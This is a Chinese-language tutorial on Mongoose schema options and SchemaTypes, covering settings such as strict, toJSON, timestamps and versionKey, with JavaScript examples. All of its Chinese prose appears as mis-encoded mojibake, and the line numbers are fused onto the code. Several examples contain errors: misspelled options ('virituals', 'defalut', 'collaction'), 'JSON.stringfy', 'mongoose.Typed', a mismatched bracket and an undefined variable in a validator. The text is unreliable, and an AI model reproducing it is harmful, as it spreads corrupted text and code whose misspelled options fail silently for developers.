1234new Schema(&#123;...&#125;,options);const schema = new Schema(&#123;...&#125;);schema.set(option,value); æœ‰æ•ˆçš„é€‰é¡¹ï¼š autoIndex bufferCommands capped collection id _id minimize read shardKey strict strictQuery toJSON toObject typekey validateBeforeSave versionKey skipVersioning timestamps useNestedStrict optionï¼šautoIndex åº”ç”¨å¯åŠ¨çš„æ—¶å€™ï¼ŒMongoose è‡ªåŠ¨å‘é€ createIndex æŒ‡ä»¤ï¼Œschema é‡Œé¢çš„æ¯ä¸ª index éƒ½ä¼šè¢«åˆ›å»ºï¼Œå¦‚æžœéœ€è¦å…³é—­è‡ªåŠ¨åˆ›å»ºåŠŸèƒ½æˆ–è€…éœ€è¦åœ¨åˆ›å»ºåŽè¿›è¡Œä¸€ç³»åˆ—æ“ä½œï¼Œå¯ä»¥æŠŠ autoIndex è®¾ä¸º falseï¼Œç„¶åŽå¯¹ model è°ƒç”¨ ensureIndexesï¼š 123const schema = new Schema(&#123;..&#125;,&#123;autoIndex:false&#125;);const Clock = mongoose.model('Clock',schema);Clock.ensureIndexes(callback); optionï¼šbufferCommands é»˜è®¤æƒ…å†µä¸‹ï¼Œmongoose buffersä¼šåœ¨è¿žæŽ¥ä¸­æ–­æ—¶å‘å‡ºå‘½ä»¤ï¼Œç›´åˆ°é©±åŠ¨ç¨‹åºé‡æ–°è¿žæŽ¥ä¸ºæ­¢ã€‚è‹¥è¦ç¦ç”¨ç¼“å†²ï¼Œè¯·å°†bufferCommandsè®¾ç½®ä¸ºfalseã€‚ 1const schema = new Schema(&#123;..&#125;,&#123;bufferCommands:false&#125;); schema çš„bufferCommands ä¼šé‡å†™å…¨å±€çš„ bufferCommands é€‰é¡¹ã€‚ 12mongoose.set('bufferCommands',true);const schema = new Schema(&#123;..&#125;,&#123;bufferCommands:false&#125;); optionï¼šcapped Mongoose æ”¯æŒ MongoDB çš„ capped collections ï¼Œè¦ä»Žåº•å±‚æŠŠ collection è®¾å®šä¸º capped(å°é¡¶)ï¼Œå¯ä»¥æŠŠcollection çš„æœ€å¤§å®¹é‡è®¾å®šåˆ° capped é€‰é¡¹ï¼ˆå•ä½ bytesï¼‰ 1new Schema(&#123;..&#125;,&#123;capped:1024&#125;); å¦‚æžœè¦ä¼ é€’å¤šä¸ªé€‰é¡¹ï¼Œcapped ä¹Ÿå¯ä»¥ä½œä¸ºå¯¹è±¡ä¼ é€’.è¿™ä¸ªè¯•è¯•éœ€è¦æ˜¾å¼ä¼ å…¥å¿…è¦å€¼ size 1new Schema(&#123;..&#125;,&#123;size:1024,max:1000,autoIndexId:true&#125;) optionï¼šcollection Mongoose é€šè¿‡ utils.toCollectionName æ–¹æ³•ï¼Œé»˜è®¤ç”Ÿæˆ collection çš„åç§°ï¼ˆç”Ÿæˆ model åç§°çš„å¤æ•°å½¢å¼ï¼‰ã€‚è®¾ç½®è¿™ä¸ªé€‰é¡¹å¯ä»¥è‡ªå®šä¹‰åç§° 1const dataSchema = new Schema(&#123;..&#125;,&#123;collection:'data'&#125;); optionï¼šid Mongoose ä¼šé»˜è®¤ç”Ÿæˆä¸€ä¸ªè™šæ‹Ÿå€¼ idï¼ŒæŒ‡å‘æ–‡æ¡£çš„ _idå­—æ®µã€‚å¦‚æžœä½ ä¸éœ€è¦ id è™šæ‹Ÿå€¼ï¼Œå¯ä»¥é€šè¿‡è¿™ä¸ªé€‰é¡¹ç¦ç”¨æ­¤åŠŸèƒ½ã€‚ 1234567891011// é»˜è®¤è¡Œä¸ºconst schema = new Schema(&#123;name:String&#125;);const Page = mongoose.model('Page',schema);const p = new Page(&#123;name:'mongodb.org'&#125;);console.log(p.id); // 50341373e894ad16347efe01//ç¦æ­¢ idconst schema = new Schema(&#123;name:String&#125;,&#123;id:false&#125;);const Page = mongoose.model('Page',schema);const p = new Page(&#123;name:'mongodb.org'&#125;);console.log(p.id); // undefined optionï¼š_id Mongoose é»˜è®¤ç»™ä½ çš„ Schema èµ‹å€¼ä¸€ä¸ª _idï¼Œè¿™ä¸ªå€¼çš„ç±»åž‹æ˜¯ ObjectIdï¼Œè¿™ä¸Ž MongoDB çš„é»˜è®¤è¡¨çŽ°ä¸€è‡´ã€‚å¦‚æžœéœ€è¦ï¼Œå¯ä»¥ç¦æ­¢ æ­¤é€‰é¡¹åªèƒ½ç”¨äºŽ subdocumentã€‚ Mongoose ä¸èƒ½ä¿å­˜æ²¡æœ‰idçš„æ–‡æ¡£ï¼Œå¦‚æžœç¡¬æ˜¯è¦è¿™ä¹ˆåšï¼Œä¼šæŠ¥é”™ã€‚ 1234567891011// é»˜è®¤è¡Œä¸ºconst schema = new Schema(&#123;name:String&#125;);const Page = mongoose.model('Page',schema);const p = new Page(&#123;name:'mongodb.org'&#125;);console.log(p); // &#123; _id: '50341373e894ad16347efe01', name: 'mongodb.org' &#125;// ç¦æ­¢ _idconst schema = new Schema(&#123;name:String&#125;,&#123;_id:false&#125;);const Page = mongoose.model('Page',schema);const p = new Page(&#123;name:'mongodb.org'&#125;);console.log(p); // &#123; name: 'mongodb.org' &#125; optionï¼šminimize Mongoose é»˜è®¤ä¸ä¿å­˜ç©ºå¯¹è±¡ã€‚ 123456789101112const schema = new Schema(&#123;name:String,inventory:&#123;&#125;&#125;);const Character = mongoose.model('Character',schema);const frodo = new Character(&#123;name:'Frodo',inventory:&#123;ringOfPower:1&#125;&#125;);Character.findOne(&#123;name:'Frodo'&#125;,function(err,character)&#123; console.log(character); // &#123;name: 'Frodo', inventory: &#123; ringOfPower: 1 &#125;&#125;&#125;);const Sam = new Character(&#123;name:'Sam',inventory:&#123;&#125;&#125;);Character.findOne(&#123;name:'Sam'&#125;,function(err,character)&#123; console.log(character); // &#123;name: 'Sam'&#125;&#125;); å¦‚æžœæŠŠ minimize è®¾å®šä¸º false,Mongoose å°†ä¿å­˜ç©ºå¯¹è±¡ 1234const Sam = new Character(&#123;name:'Sam',inventory:&#123;&#125;&#125;,&#123;minimize:false&#125;);Character.findOne(&#123;name:'Sam'&#125;,function(err,character)&#123; console.log(character); // &#123;name: 'Sam',inventory:&#123;&#125;&#125;&#125;); optionï¼šread 12345const schema = new Schema(&#123;..&#125;, &#123; read: 'primary' &#125;);// also aliased as 'p'const schema = new Schema(&#123;..&#125;, &#123; read: 'primaryPreferred' &#125;);// aliased as 'pp'const schema = new Schema(&#123;..&#125;, &#123; read: 'secondary' &#125;);// aliased as 's'const schema = new Schema(&#123;..&#125;, &#123; read: 'secondaryPreferred' &#125;);// aliased as 'sp'const schema = new Schema(&#123;..&#125;, &#123; read: 'nearest' &#125;);// aliased as 'n' 12345const options = &#123; replset: &#123; strategy: 'ping' &#125;&#125;;mongoose.connect(uri, options);const schema = new Schema(&#123;..&#125;, &#123; read: ['nearest', &#123; disk: 'ssd' &#125;] &#125;);mongoose.model('JellyBean', schema); optionï¼šshardKey åˆ†ç‰‡ç›¸å…³. 1new Schema(&#123; .. &#125;, &#123; shardKey: &#123; tag: 1, name: 1 &#125;&#125;) optionï¼šstrict Strict é€‰é¡¹é»˜è®¤ä¸º trueï¼Œè¿™æ„å‘³ç€ä½ ä¸èƒ½ save schema é‡Œæ²¡æœ‰å£°æ˜Žçš„å±žæ€§ã€‚ 123456789const thingSchema = new Schema(&#123;..&#125;)const Thing = mongoose.model('Thing', thingSchema);const thing = new Thing(&#123; iAmNotInTheSchema: true &#125;);thing.save(); // iAmNotInTheSchema is not saved to the db// set to false..const thingSchema = new Schema(&#123;..&#125;, &#123; strict: false &#125;);const thing = new Thing(&#123; iAmNotInTheSchema: true &#125;);thing.save(); // iAmNotInTheSchema is now saved to the db!! doc.set() ä¹Ÿå—è¯¥é€‰é¡¹å½±å“ï¼š 12345const thingSchema = new Schema(&#123;..&#125;)const Thing = mongoose.model('Thing', thingSchema);const thing = new Thing;thing.set('iAmNotInTheSchema', true);thing.save(); // iAmNotInTheSchema is not saved to the db è¿™ä¸ªå€¼å¯ä»¥åœ¨ model çº§åˆ«é‡å†™ï¼Œåœ¨ç¬¬äºŒä¸ªå‚æ•°å€¼ä¼ å…¥ï¼š 123const Thing = mongoose.model('Thing');const thing = new Thing(doc, true); // enables strict modeconst thing = new Thing(doc, false); // disables strict mode è¿˜å¯ä»¥å°†stricté€‰é¡¹è®¾ç½®ä¸ºâ€œthrowâ€ï¼Œè¿™å°†å¯¼è‡´äº§ç”Ÿé”™è¯¯ï¼Œè€Œä¸æ˜¯åˆ é™¤åæ•°æ®ã€‚ æ³¨æ„:åœ¨ schema ä¸­ä¸å­˜åœ¨çš„å®žä¾‹ä¸Šè®¾ç½®çš„ä»»ä½•é”®/å€¼æ€»æ˜¯è¢«å¿½ç•¥ï¼Œä¸ç®¡æ¨¡å¼é€‰é¡¹æ˜¯ä»€ä¹ˆã€‚ 12345const thingSchema = new Schema(&#123;..&#125;)const Thing = mongoose.model('Thing', thingSchema);const thing = new Thing;thing.iAmNotInTheSchema = true;thing.save(); // iAmNotInTheSchema is never saved to the db optionï¼šstrictQuery 12345const mySchema = new Schema(&#123; field: Number &#125;, &#123; strict: true &#125;);const MyModel = mongoose.model('Test', mySchema);// Mongoose will **not** filter out `notInSchema: 1`, despite `strict: true`MyModel.find(&#123; notInSchema: 1 &#125;); ä¸¥æ ¼çš„é€‰æ‹©é€‚ç”¨äºŽæ›´æ–° 12// Mongoose will strip out `notInSchema` from the update if `strict` is not `false`MyModel.updateMany(&#123;&#125;, &#123; $set: &#123; notInSchema: 1 &#125; &#125;); Mongoose æœ‰ä¸€ä¸ªå•ç‹¬çš„ strictQuery é€‰é¡¹ï¼Œç”¨äºŽå°†è¿‡æ»¤å™¨å‚æ•°çš„strictæ¨¡å¼åˆ‡æ¢åˆ°æŸ¥è¯¢ã€‚ 12345678const mySchema = new Schema(&#123; field: Number &#125;, &#123; strict: true, strictQuery: true // Turn on strict mode for query filters&#125;);const MyModel = mongoose.model('Test', mySchema);// Mongoose will strip out `notInSchema: 1` because `strictQuery` is `true`MyModel.find(&#123; notInSchema: 1 &#125;); optionï¼štoJSON ä¸ŽtoObjecté€‰é¡¹å®Œå…¨ç›¸åŒï¼Œä½†ä»…åœ¨è°ƒç”¨documents toJSONæ–¹æ³•æ—¶æ‰é€‚ç”¨ã€‚ 12345678910const schema = new Schema(&#123;name:String&#125;);schema.path('name').get(function(v)&#123; return v +' is my name';&#125;);schema.set('toJSON',&#123;getters:true,virituals:false&#125;);const M = mongoose.model('Person',schema);const m = new M(&#123;name:'Max Headroom'&#125;); m.toObject(); // &#123;_id: 504e0cd7dd992d9be2f20b6f, name: 'Max Headroom' &#125;m.toJSON(); // &#123;_id: 504e0cd7dd992d9be2f20b6f, name: 'Max Headroom is my name' &#125;JSON.stringfy(m); // &#123; "_id": "504e0cd7dd992d9be2f20b6f", "name": "Max Headroom is my name" &#125; optionï¼štoObject Documents çš„ toObject æ–¹æ³•å¯ä»¥æŠŠæ–‡æ¡£è½¬æ¢æˆä¸€ä¸ª plain javascript object ï¼ˆä¹Ÿå°±æ˜¯åŽ»æŽ‰é‡Œé¢çš„æ–¹æ³•ï¼‰ã€‚ è¿™æ˜¯ä¸€ä¸ªå¯ä»¥æŽ¥æ”¶å¤šä¸ªå‚æ•°çš„æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ schemas å®šä¹‰è¿™äº›å‚æ•°ã€‚ ä¾‹å¦‚è¦æ‰“å°å‡ºè™šæ‹Ÿå€¼ï¼Œå¯ä»¥å‘ toObject ä¼ å…¥ { getters: true }ï¼š 12345678const schema = new Schema(&#123;name:String&#125;);schema.path('name').get(function(v)&#123; return v + 'is my name'&#125;);schema.set('toObject',&#123;getters:true&#125;);const M = mongoose.model('Person',schema);const m = new M(&#123;name:'HAHA'&#125;);m // &#123; _id: 504e0cd7dd992d9be2f20b6f, name: 'HAHA is my name' &#125; optionï¼štypekey ç±»åž‹å£°æ˜Ž 1const schema = new Schema(&#123;loc:&#123;type:String,coordinates:[Number]&#125;&#125;); å¯¹äºŽåƒgeoJSONè¿™æ ·çš„åº”ç”¨ç¨‹åºï¼Œâ€œtypeâ€å±žæ€§éžå¸¸é‡è¦ã€‚æŽ§åˆ¶ä½¿ç”¨å“ªä¸ªé”®mongooseæ¥æŸ¥æ‰¾ç±»åž‹å£°æ˜Žï¼Œè¦è®¾ç½®â€œtypeKeyâ€æ¨¡å¼é€‰é¡¹ 123456789const schema = new Schema(&#123; loc:&#123; type:String, coordinates:[Number], &#125;, name:&#123; $type:String &#125;&#125;,&#123;typeKey:'$type'&#125;); optionï¼švalidateBeforeSave é»˜è®¤æƒ…å†µä¸‹ï¼Œæ–‡æ¡£åœ¨ä¿å­˜åˆ°æ•°æ®åº“ä¹‹å‰ä¼šè‡ªåŠ¨éªŒè¯ã€‚è¿™æ˜¯ä¸ºäº†é˜²æ­¢ä¿å­˜æ— æ•ˆçš„æ–‡æ¡£ã€‚å¦‚æžœå¸Œæœ›æ‰‹åŠ¨å¤„ç†éªŒè¯ï¼Œå¹¶èƒ½å¤Ÿä¿å­˜æ²¡æœ‰é€šè¿‡éªŒè¯çš„å¯¹è±¡ï¼Œå¯ä»¥å°†validatebeforeaveè®¾ç½®ä¸ºfalseã€‚ 1234567891011const schema = new Schema(&#123; name: String &#125;);schema.set('validateBeforeSave', false);schema.path('name').validate(function (value) &#123; return v != null;&#125;);const M = mongoose.model('Person', schema);const m = new M(&#123; name: null &#125;);m.validate(function(err) &#123; console.log(err); // Will tell you that null is not allowed.&#125;);m.save(); // Succeeds despite being invalid optionï¼šversionKey versionKey æ˜¯ Mongoose åœ¨æ–‡ä»¶åˆ›å»ºæ—¶è‡ªåŠ¨è®¾å®šçš„ã€‚ è¿™ä¸ªå€¼åŒ…å«æ–‡ä»¶çš„å†…éƒ¨ä¿®è®¢å·ã€‚ versionKey æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä»£è¡¨ç‰ˆæœ¬å·çš„å±žæ€§åï¼Œ é»˜è®¤å€¼ä¸º __vã€‚å¦‚æžœè¿™ä¸ªå€¼ä¸Žä½ çš„è®¡åˆ’å†²çªï¼Œä½ å¯ä»¥è®¾å®šä¸ºå…¶ä»–åç§°ï¼š 12345678910const schema = new Schema(&#123; name: 'string' &#125;);const Thing = mongoose.model('Thing', schema);const thing = new Thing(&#123; name: 'mongoose v3' &#125;);thing.save(); // &#123; __v: 0, name: 'mongoose v3' &#125;// customized versionKeynew Schema(&#123;..&#125;, &#123; versionKey: '_somethingElse' &#125;)const Thing = mongoose.model('Thing', schema);const thing = new Thing(&#123; name: 'mongoose v3' &#125;);thing.save(); // &#123; _somethingElse: 0, name: 'mongoose v3' &#125; ä½ ä¹Ÿå¯ä»¥èµ‹å€¼ä¸º false ç¦ç”¨ versionKeyã€‚ 1234const Schema(&#123;..&#125;, &#123; versionKey: false &#125;);const Thing = mongoose.model('Thing', schema);const thing = new Thing(&#123; name: 'no versioning please' &#125;);thing.save(); // &#123; name: 'no versioning please' &#125; optionï¼šcollation ä¸º æŸ¥è¯¢ï¼ˆqueryï¼‰å’Œ èšåˆï¼ˆaggregationï¼‰è®¾ç½® collation 123456789101112131415const schema = new Schema(&#123; name:String&#125;,&#123; collaction:&#123; locale:'en_US', strength:1 &#125;&#125;)const MyModel = db.model('MyModel',schema);myModel.create([&#123;name:'val',&#123;name:'Val'&#125;]).then(function()&#123; return MyModel.find(&#123;name:'Val'&#125;);&#125;).then(function(docs)&#123; // docs é‡Œé¢ä¼šåŒ…å«ä¸Šé¢ä¸¤ä¸ªå€¼ï¼Œå› ä¸º strengthï¼š1 ä»£è¡¨ç€å¿½ç•¥å¤§å°å†™&#125;); optionï¼šskipVersioning è·³è¿‡ç‰ˆæœ¬æŽ§åˆ¶å…è®¸ä»Žç‰ˆæœ¬æŽ§åˆ¶ä¸­æŽ’é™¤è·¯å¾„(ä¾‹å¦‚ã€‚ï¼Œå³ä½¿æ›´æ–°äº†è¿™äº›è·¯å¾„ï¼Œä¹Ÿä¸ä¼šå¢žåŠ å†…éƒ¨ä¿®è®¢)ã€‚é™¤éžä½ çŸ¥é“ä½ åœ¨åšä»€ä¹ˆï¼Œå¦åˆ™ä¸è¦è¿™æ ·åšã€‚å¯¹äºŽå­æ–‡æ¡£ï¼Œä½¿ç”¨å®Œå…¨é™å®šè·¯å¾„å°†å…¶åŒ…å«åœ¨çˆ¶æ–‡æ¡£ä¸­ã€‚ 123new Schema(&#123;..&#125;, &#123; skipVersioning: &#123; dontVersionMe: true &#125; &#125;);thing.dontVersionMe.push('hey');thing.save(); // version is not incremented optionï¼štimestamps å¦‚æžœè®¾ç½®äº† timestamps é€‰é¡¹, mongoose ä¼šåœ¨ä½ çš„ schema è‡ªåŠ¨æ·»åŠ  createdAt å’Œ updatedAt å­—æ®µï¼Œ å…¶ç±»åž‹ä¸ºDateã€‚è¿™ä¸¤ä¸ªå­—æ®µçš„é»˜è®¤åç§°æ˜¯ createAtå’Œ updateAtï¼Œä½ å¯ä»¥é€šè¿‡è®¾å®š timestamps.createAt å’Œ timestamps.updateAt è‡ªå®šä¹‰åç§°ã€‚ 1234const thingSchema = new Schema(&#123;..&#125;, &#123; timestamps: &#123; createdAt: 'created_at' &#125; &#125;);const Thing = mongoose.model('Thing', thingSchema);const thing = new Thing();thing.save(); // `created_at` &amp; `updatedAt` will be included optionï¼šuseNestedStrict åœ¨ mongoose4 ä¸­ï¼Œupdate() å’Œ findOneAndUpdate()åªæ£€æŸ¥é¡¶å±‚ schema çš„ä¸¥æ ¼æ¨¡å¼è®¾å®šã€‚ 12345678910111213const childSchema = new Schema(&#123;&#125;, &#123; strict: false &#125;);const parentSchema = new Schema(&#123; child: childSchema &#125;, &#123; strict: 'throw' &#125;);const Parent = mongoose.model('Parent', parentSchema);Parent.update(&#123;&#125;, &#123; 'child.name': 'Luke Skywalker' &#125;, function(error) &#123; // æŠ¥é”™ï¼åŽŸå› æ˜¯çˆ¶Schemaè®¾å®šä¸º`strict: throw`ï¼Œä½†æ˜¯å› ä¸ºåªæ£€æŸ¥é¡¶å±‚ï¼Œå¯¼è‡´ // å­Schemaçš„ `strict: false` é­åˆ°æ— æƒ…å¿½è§†&#125;);const update = &#123; 'child.name': 'Luke Skywalker' &#125;;const opts = &#123; strict: false &#125;;Parent.update(&#123;&#125;, update, opts, function(error) &#123; // è¿™æ ·å¯ä»¥ï¼Œå› ä¸ºé‡å†™äº†çˆ¶Schemaçš„ strict é€‰é¡¹&#125;); å¦‚æžœä½ æŠŠ useNestedStrict è®¾ä¸º trueï¼Œmongoose å°±ä¸ä¼šå¿½ç•¥åµŒå¥—çš„ strict è®¾å®šã€‚ 1234567const childSchema = new Schema(&#123;&#125;, &#123; strict: false &#125;);const parentSchema = new Schema(&#123; child: childSchema &#125;, &#123; strict: 'throw', useNestedStrict: true &#125;);const Parent = mongoose.model('Parent', parentSchema);Parent.update(&#123;&#125;, &#123; 'child.name': 'Luke Skywalker' &#125;, function(error) &#123; // Works!&#125;); æ¨¡å¼ç±»åž‹ï¼ˆSchemaTypesï¼‰SchemaTypes æ˜¯å¤„ç†å­—æ®µè·¯å¾„å„ç§å±žæ€§çš„å®šä¹‰ï¼ˆé»˜è®¤å€¼ã€éªŒè¯ã€getterã€setterã€æŸ¥è¯¢çš„å­—æ®µé€‰æ‹©é»˜è®¤å€¼ï¼Œä»¥åŠå­—ç¬¦ä¸²å’Œæ•°å­—çš„å…¶ä»–ä¸€èˆ¬ç‰¹æ€§ï¼‰ ä¸‹é¢æ˜¯åˆæ³•çš„ SchemaTypesï¼š String Number Date Buffer Boolean Mixed ObjectId Array Decimal128 ä¾‹å­ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556const schema = new Schema(&#123; name:String, binary:Buffer, living:Boolean, updated:&#123; type:Date, default:Date.now &#125;, age:&#123; type:Number, min:18, max:65 &#125;, mixed:Schema.Types.Mixed, _someId:Schema.Types.ObjectId, decimal:Schema.Types.Decimal128, array:[], ofString:[String], ofNumber:[Number], ofDates:[Date], ofBuffer:[Buffer], ofBoolean:[Boolean], ofMixed:[Schema.Types.Mixed], ofObjectId:[Schema.Types.ObjectId], ofArrays:[[]], ofArrayOfNumbers:[[Number]], nested:&#123; stuff:&#123; type:String, lowercase:true, trim:true &#125; &#125;&#125;);const Thing = mongoose.model('Thing',schema);const m = new Thing;m.name = 'haha';m.age = 125;m.updated = new Date;m.binary = new Buffer(0);m.mixed = &#123; any:&#123; thing:'i want' &#125;&#125;m.markModified('mixed');m._someId = new mongoose.Typed.ObjectId;m.array.push(1);m.ofString.push('strings!');m.ofNumber.unshift(1,2,3,4);m.ofDates.addToSet(new Date);m.ofBuffer.pop();m.ofMixed = [1,[],'three',&#123;four:5&#125;]m.nested.stuff = 'good';m.save(callback); SchemaType é€‰é¡¹å¯ä»¥ç›´æŽ¥å£°æ˜Ž schema type ä¸ºæŸä¸€ç§ typeï¼Œæˆ–è€…èµ‹å€¼ä¸€ä¸ªå«æœ‰ type å±žæ€§çš„å¯¹è±¡ 12345678const schema = new Schema(&#123; test:String&#125;);const schema2 = new Schema(&#123; test:&#123; type:String &#125;&#125;); é™¤äº† type å±žæ€§ï¼Œè¿˜å¯ä»¥å¯¹è¿™ä¸ªå­—æ®µè·¯å¾„æŒ‡å®šå…¶ä»–å±žæ€§ï¼Œå¦‚æžœè¦åœ¨ä¿å­˜ä¹‹å‰æŠŠå­—æ¯éƒ½æ”¹æˆå°å†™ï¼š 123456const schema2 = new Schema(&#123; test:&#123; type:String, lowercase:true &#125;&#125;); lowercase å±žæ€§åªä½œç”¨äºŽå­—ç¬¦ä¸²ã€‚ä»¥ä¸‹æœ‰ä¸€äº›å…¨éƒ¨type å¯ç”¨çš„é€‰é¡¹å’Œä¸€äº›é™å®šéƒ¨åˆ† type ä½¿ç”¨çš„é€‰é¡¹ã€‚ å…¨éƒ¨å¯ç”¨ requiredï¼šå¸ƒå°”å€¼æˆ–è€…å‡½æ•°ï¼Œå¦‚æžœå€¼ä¸ºçœŸï¼Œä¸ºæ­¤å±žæ€§æ·»åŠ  required éªŒè¯å™¨ defaultï¼šä»»ä½•å€¼æˆ–è€…å‡½æ•°è®¾ç½®æ­¤è·¯å¾„é»˜è®¤å€¼ï¼Œå¦‚æžœæ˜¯å‡½æ•°ï¼Œå‡½æ•°è¿”å›žå€¼ä¸ºé»˜è®¤å€¼ selectï¼šå¸ƒå°”å€¼æ‰§è¡Œquery é»˜è®¤ projections validateï¼šå±žæ€§éªŒè¯å‡½æ•° getï¼šå‡½æ•° ä½¿ç”¨ Object.defineProperty() å®šä¹‰è‡ªå®šä¹‰ getter setï¼šå‡½æ•° ä½¿ç”¨ Object.defineProperty() å®šä¹‰è‡ªå®šä¹‰ setter aliasï¼šå­—ç¬¦ä¸² ä»…mongoose &gt;= 4.10.0ã€‚ ä¸ºè¯¥å­—æ®µè·¯å¾„å®šä¹‰è™šæ‹Ÿå€¼ gets/sets 1234567891011121314151617const numberSchema = new Schema(&#123; integerOnly:&#123; type:Number, get:v =&gt; Math.round(v), set:v =&gt; Math.round(v), alias:'i' &#125;&#125;);const Number = mongoose.model('Number',numberSchema);const doc = new Number();doc.integerOnly = 2.001;doc.integerOnly // 2doc.i // 2doc.i = 3.001;doc.integerOnly //3doc.i //3 ç´¢å¼•ç›¸å…³ å¯ä»¥ä½¿ç”¨ schema type é€‰é¡¹å®šä¹‰ MongoDB indexex index:å¸ƒå°”å€¼ æ˜¯å¦å¯¹è¿™ä¸ªå±žæ€§åˆ›å»ºç´¢å¼• unique:å¸ƒå°”å€¼ æ˜¯å¦å¯¹è¿™ä¸ªå±žæ€§åˆ›å»ºå”¯ä¸€ç´¢å¼• sparse:å¸ƒå°”å€¼ æ˜¯å¦å¯¹è¿™ä¸ªå±žæ€§åˆ›å»ºç¨€ç–ç´¢å¼• 1234567const schema = new Schema(&#123; test:&#123; type:String, index:true, unique:true &#125;&#125;); String lowercase: å¸ƒå°”å€¼ æ˜¯å¦ä¿å­˜å‰å¯¹æ­¤å€¼è°ƒç”¨ .toLowerCase() uppercase: å¸ƒå°”å€¼ æ˜¯å¦ä¿å­˜å‰å¯¹æ­¤å€¼è°ƒç”¨ .toUpperCase() trim: å¸ƒå°”å€¼ æ˜¯å¦åœ¨ä¿å­˜å‰å¯¹æ­¤å€¼è°ƒç”¨ trim() match:æ­£åˆ™è¡¨è¾¾å¼ åˆ›å»ºéªŒè¯å™¨æ£€æŸ¥è¿™ä¸ªå€¼æ˜¯å¦åŒ¹é…ç»™å®šæ­£åˆ™è¡¨è¾¾å¼ enum:æ•°ç»„ åˆ›å»ºéªŒè¯å™¨æ£€æŸ¥è¿™ä¸ªå€¼æ˜¯å¦åŒ…å«äºŽç»™å®šæ•°ç»„ Number min:æ•°å€¼ åˆ›å»ºéªŒè¯å™¨æ£€æŸ¥å±žæ€§æ˜¯å¦å¤§äºŽæˆ–è€…ç­‰äºŽè¯¥å€¼ max:æ•°å€¼ åˆ›å»ºéªŒè¯å™¨æ£€æŸ¥å±žæ€§æ˜¯å¦å°äºŽæˆ–è€…ç­‰äºŽè¯¥å€¼ Date min:Date max:Date ä½¿ç”¨æ³¨æ„Dates å†…å»ºçš„ Date æ–¹æ³•ä¸ä¼šè§¦å‘ mongoose ä¿®æ”¹è·Ÿè¸ªé€»è¾‘ï¼Œå¦‚æžœä½¿ç”¨ setMonth() ä¿®æ”¹æ–‡æ¡£é‡Œé¢çš„ Date,mongoose åœ¨ doc.save() çš„æ—¶å€™æ˜¯å¯Ÿè§‰ä¸åˆ°è¿™ä¸ªæ–‡æ¡£å‘ç”Ÿäº†å˜åŒ–çš„ï¼Œå› æ­¤ä¿å­˜ä¸åˆ°æ•°æ®åº“ä¸­ã€‚å¦‚æžœä¸€å®šè¦ç”¨å†…å»ºçš„ Date æ–¹æ³•ï¼Œéœ€è¦æ‰‹åŠ¨è°ƒç”¨ doc.markModified(&#39;pathToYourDate&#39;)å‘Šè¯‰ mongoose ä¿®æ”¹äº†æ•°æ®ã€‚ 1234567const Assignment = mongoose.model('Assignment',&#123;dueDate:Date&#125;);Assignment.findOne(function(err,doc)&#123; doc.dueDate.setMonth(3); doc.save(callback); // è¿™ä¸ªä¸ä¼šä¿å­˜ä½ çš„ä¿®æ”¹ doc.markModified('dueDate'); doc.save(callback);&#125;); Mixed ä¸€ä¸ªä»€ä¹ˆéƒ½å¯ä»¥æ”¾çš„ SchemaType,è™½ç„¶éåŽ†ï¼Œä½†æ˜¯ä¹Ÿä¼šè®©æ•°æ®éš¾ä»¥ç»´æŠ¤ã€‚Mixed å¯ä»¥é€šè¿‡ Schema.Types.Mixed æˆ–è€…ä¼ å…¥ ä¸€ä¸ªç©ºå¯¹è±¡å®šä¹‰ã€‚ä¸‹é¢ä¸‰ç§æ–¹æ³•æ•ˆæžœæ˜¯ä¸€è‡´çš„ã€‚ 123const Any = new Schema(&#123;any:&#123;&#125;&#125;);const Any = new Schema(&#123;any:Object&#125;);const Any = new Schema(&#123;any:Schema.Types.Mixed&#125;); å› ä¸ºè¿™æ˜¯ä¸ª schema-less typeï¼Œæ‰€ä»¥å¯ä»¥èµ‹å€¼ä¸ºä»»æ„ç±»åž‹ï¼Œä½†æ˜¯ mongoose æ— æ³•è‡ªåŠ¨æ£€æµ‹å¹¶ä¿å­˜ä¿®æ”¹ã€‚è¦å‘Šè¯‰å®ƒä¿®æ”¹äº† Mixed type çš„å€¼ï¼Œè°ƒç”¨æ–‡æ¡£çš„ .markModified(path) æ–¹æ³•ï¼Œä¼ å…¥ä½ çš„ Mixed å­—æ®µè·¯å¾„ 123person.anything = &#123;x:[3,4,&#123;y:'changed'&#125;]&#125;person.markModified('anything');person.save(); // anything will now get changed ObjectIds è¦æŒ‡å®šç±»åž‹ä¸º ObjectIdï¼Œåœ¨å£°æ˜Žä¸­ä½¿ç”¨ Schema.Types.ObjectId 123const mongoose = require('mongoose');const ObjectId = mongoose.Schema.Types.ObjectId;const Car = new Schema(&#123;driver:ObjectId&#125;); Arrays åˆ›é€  SchemaTypes æˆ–è€…å­æ–‡æ¡£æ•°ç»„ 1234567const ToySchema = new Schema(&#123;name:String&#125;);const ToyBox = new Schema(&#123; toys:[ToySchema], buffers:[Buffer], string:[String]ï¼Œ number:[Number]&#125;); æ³¨æ„ï¼šæŒ‡å®šç©ºæ•°ç»„ç›¸å½“äºŽ Mixed,ä¸‹é¢çš„æ“ä½œç›¸å½“äºŽåˆ›å»º Mixedæ•°ç»„ï¼š 1234const Empty1 = new Schema(&#123;ary:&#123;]&#125;&#125;);const Empty2 = new Schema(&#123;any:Array&#125;);const Empty3 = new Schema(&#123;any:[Schema.Types.Mixed]&#125;);const Empty4 = new Schema(&#123;any:[&#123;&#125;]&#125;); æ•°ç»„çš„é»˜è®¤å€¼æ˜¯ []ï¼ˆç©ºæ•°ç»„ï¼‰ 12const Toy = mongoose.model('Test',toySchema);new Toy().toys // [] è¦æ‰‹åŠ¨æŠŠé»˜è®¤å€¼è®¾ç½®ä¸º undefinedï¼Œä»Žè€Œè¦†ç›– [] 123456const ToySchema = new Schema(&#123; toys:&#123; type:[ToySchema], defalut:undefined &#125;&#125;); åˆ›å»ºè‡ªå®šä¹‰ TypeMongoose å¯ä»¥æ‰©å±•è‡ªå®šä¹‰ SchemaType. schema.path()å‡½æ•° è¿™ä¸ªå‡½æ•°ä¸ºç»™å®šå­—æ®µè·¯å¾„è¿”å›žå®žä¾‹åŒ– schema type 12345678910const sampleSchema = new Schema(&#123;name:&#123;type:String,require:true&#125;&#125;);sampleSchema.path('name');/*** SchemaString &#123; * enumValues: [], * regExp: null, * path: 'name', * instance: 'String', * validators: ...*/ 